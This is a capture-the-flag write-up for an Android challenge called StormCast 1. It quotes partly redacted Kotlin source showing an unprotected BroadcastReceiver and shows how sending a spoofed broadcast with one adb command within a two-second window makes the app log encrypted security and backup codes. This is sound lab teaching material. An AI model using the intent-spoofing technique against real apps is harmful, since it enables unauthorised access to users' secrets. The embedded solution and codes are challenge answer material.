# StormCast 1

I have obtained a prototype of the new authentication app for the StormCast Messenger inlcuding some bit's of the source code. 
My contact on the inside told me that they are using an advanced security code system called SEC_CODE. 
If we want to get the backup code, we need to find a way to tamper with the SEC_CODE system to get the backup codes.

## Task

Find a way to get the SEC_CODE and the backup codes.

## Solution

Take a look at the retrieved source code.

In the `MainActivity.kt` we can find that there is a check for a Broadcast Reciever if it is called and the returned value is `true`

```Kotlin

context.registerReceiver(stormB####castReceiver, ###################### IntentFilter("com.appweather.stormcast.SEC_CODE_READY"))
delay(2000) // Delay to ##################################################

############################################################
############################################################
########################## BROKEN ##########################
############################################################
############################################################

if (stormBroadcastReceiver.secCodeReady) {
  val encryptedCode = fetchEncryptedSecCode(apiUrl)
  decryptedCode = decryptCode(encryptedCode)
} else {
  Toast.makeText(context, "Ple#se wait######## for the ########################### to be ready", Toast.LENGTH_SHORT).show()
}
```

From that we can see that there is a 2 second time window before the code is checked.

If we take a look at `StormAuthenticator.kt` we can see that the function `decryptCode()` is being defined and is here to decrypt the message.

```Kotlin
fun decryptCode(encryptedMessage: String): String {
    val en#yptionKey = ################################################################
############################################################
############################################################
########################## BROKEN ##########################
############################################################
############################################################

    val jsonResponse = JSONObject(encryptedMessage)
    val encry##########ge = jsonResponse.getString("code")

    val key = Key(encryptionKey##########################

    val token = ######################## Token.fromString(encryptedMessage)

    val validator: Validator<String> = object : StringValidator {
        override fun getTimeToLive(): TemporalAmount {
            return Duration.ofHours(24)
        }
    }
    // return #############
    return token.validateAndDecrypt(key, validator)
```

The encryption is done with Fernet and a encryptionKey that unfortunately is broken.

But this function gets triggered if the `SEC_CODE_READY` is true. So let's take a look at the BroadcastReciever:

```Kotlin
class StormBroadcastReceiver : BroadcastReceiver(############################# 

    var secCodeReady = ###### // Variable to indicate if flag fetching is allowed

    override fun onReceive(context: Context?, intent: Intent?###########################) {
        if (intent?.action == "com.appweather.stormcast.SEC_CODE_READY") {

############################################################
############################################################
########################## BROKEN ##########################
############################################################
############################################################

            secCodeReady = true
          
############################################################
############################################################
########################## BROKEN ##########################
############################################################
############################################################

        }
```

Ok, `SEC_CODE_READY` is set to true when the app recieves a broadcast and this needs to be done in a two second time window when the button in the app is pressed.

Sounds easy! So let's install the `.apk` file and attach a Logcat to the device.

If that is done we can click on the button and send at the same time a command with ADB to the phone:

```
adb shell am broadcast -a com.appweather.stormcast.SEC_CODE_READY
```

And here is the flag:
![image](https://github.com/CTF-Citadel/challenges/assets/66524685/1ee469a2-6439-42a9-8d10-0eb4512c77aa)

If we takea look at the Logcat output we can see this:
```
2024-01-24 17:33:27.453 20117-20224 API_RESPONSE            com.appweather.stormcast             D  {"code":"gAAAAABlsTvX0YSoyGinqvshvl7s-SU6HUGhaD_BJXWXRYaAKxAz-E1sMfNBM4hUg_MGrafSoVnCrA713PUTekkQMoGVOl83tXpjHd-KKLfXzp59rWL3ivk=","backup_code":"gAAAAABlsTvXEGM33GmVNvCj-bAk9ml6UzTl7u7AJedT07In9MG9aZykgP05nEP4lGoHJJDZ22-eYuR1qyP6caPBxG2pxrrTZA=="}
2024-01-24 17:33:27.454 20117-20224 StormCast               com.appweather.stormcast             D  Encrypted backup code: gAAAAABlsTvXEGM33GmVNvCj-bAk9ml6UzTl7u7AJedT07In9MG9aZykgP05nEP4lGoHJJDZ22-eYuR1qyP6caPBxG2pxrrTZA==
```

Maybe we need this later ...
